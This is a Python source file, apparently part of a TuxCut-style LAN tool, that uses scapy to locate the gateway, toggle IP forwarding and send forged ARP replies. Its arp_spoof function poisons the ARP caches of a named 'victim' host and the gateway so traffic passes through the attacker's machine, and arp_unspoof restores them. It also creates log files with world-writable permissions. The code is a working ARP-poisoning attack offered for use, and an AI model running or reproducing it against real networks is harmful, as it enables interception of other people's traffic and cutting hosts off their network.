import os
from pathlib import Path
import sys
import subprocess as sp
import logging
from scapy.all import *
from scapy.layers.l2 import ARP
import netifaces

HOME_DIR = str(Path.home())
LOG_DIR = HOME_DIR +'/.cache/arproof/log'
if not os.path.isdir(LOG_DIR):
    os.makedirs(LOG_DIR, exist_ok=True)
    server_log = Path(os.path.join(LOG_DIR, 'tuxcutd.log'))
    server_log.touch(exist_ok=True)
    server_log.chmod(0o666)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('tuxcut-server')
handler = logging.FileHandler(os.path.join(LOG_DIR, 'tuxcut.log'))
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)

logger.addHandler(handler)


# def get_ifaces():
#     """
#     all the available network interfaces except  'lo'
#     """
#     ifaces = netifaces.interfaces()
#     if 'lo' in ifaces:
#         ifaces.remove('lo')
#     return ifaces


def get_hostname(ip):
    """
    use nslookup from dnsutils package to get hostname for an ip
    """
    try:
        ans = sp.Popen(['nslookup', ip], stdout=sp.PIPE)
        for line in ans.stdout:
            line = line.decode('utf-8')
            if 'name = ' in line:
                return line.split(' ')[-1].strip('.\n')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
    return ''


def get_default_gw():
    """
    Get the default gw ip address with the iface
    """

    # netifaces.AF_INET = 2
    gw = dict()
    if netifaces.AF_INET in netifaces.gateways()['default']:
        default_gw = netifaces.gateways()['default'][netifaces.AF_INET]

        # initialize gw_mac with empty string
        gw_mac = ''

        # send arp packet to gw to get the MAC Address of the router
        try:
            results, unanswered = sr(ARP(op="who-has", psrc='8.8.8.8', pdst=default_gw[0]))
            for r in results[0]:
                if r.psrc == default_gw[0]:
                    gw_mac = r.hwsrc

            gw['ip'] = default_gw[0]
            gw['mac'] = gw_mac
            gw['hostname'] = get_hostname(default_gw[0])
            gw['iface'] = default_gw[1]

            logger.info('gw successfully retrieved')
        except Exception as e:
            logger.error(sys.exc_info()[1], exc_info=True)

    return gw


def get_my(iface):
    """
    find the IP and MAC  addressess for the given interface
    """
    my = dict()
    try:
        my['ip'] = get_if_addr(iface)
        my['mac'] = get_if_hwaddr(iface)
        my['hostname'] = get_hostname(get_if_addr(iface))
        logger.info('My info succssfully retrieved')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
    return my


def enable_ip_forward():
    try:
        sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        logger.info('IP forward Enabled')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def disable_ip_forward():
    try:
        sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
        logger.info('IP Forward Disabled')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def arp_spoof(victim):

    gw = get_default_gw()
    my = get_my(gw['iface'])
    logger.info('attacking host {}'.format(victim['ip']))

    # Cheat the victim
    to_victim = ARP()
    to_victim.op = 2    # make packet 'is-at'
    to_victim.psrc = gw['ip']
    to_victim.hwsrc = my['mac']
    to_victim.pdst = victim['ip']
    to_victim.hwdst = victim['mac']

    # Cheat the gateway
    to_gw = ARP()
    to_gw.op = 2  # make packet 'is-at'
    to_gw.psrc = victim['ip']
    to_gw.hwsrc = my['mac']
    to_gw.pdst = gw['ip']
    to_gw.hwdst = gw['mac']
    try:
        send(to_victim, count=5)
        send(to_gw, count=5)
        logger.info('Done Spoofing host')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def arp_unspoof(victim):
    gw = get_default_gw()
    logger.info('resuming host {}'.format(victim['ip']))
    # Fix  the victim arp table
    to_victim = ARP()
    to_victim.op = 2  # make packet 'is-at'
    to_victim.psrc = gw['ip']
    to_victim.hwsrc = gw['mac']
    to_victim.pdst = victim['ip']
    to_victim.hwdst = victim['mac']

    # Fix the gateway arp table
    to_gw = ARP()
    to_gw.op = 2  # make packet 'is-at'
    to_gw.psrc = victim['ip']
    to_gw.hwsrc = victim['mac']
    to_gw.pdst = gw['ip']
    to_gw.hwdst = gw['mac']

    try:
        send(to_victim, count=10)
        send(to_gw, count=10)
        logger.info('Done Resuming host')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def generate_mac():
	return ':'.join(map(lambda x: "%02x" % x, [ 0x00,
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0xff),
												random.randint(0x00, 0xff)]))
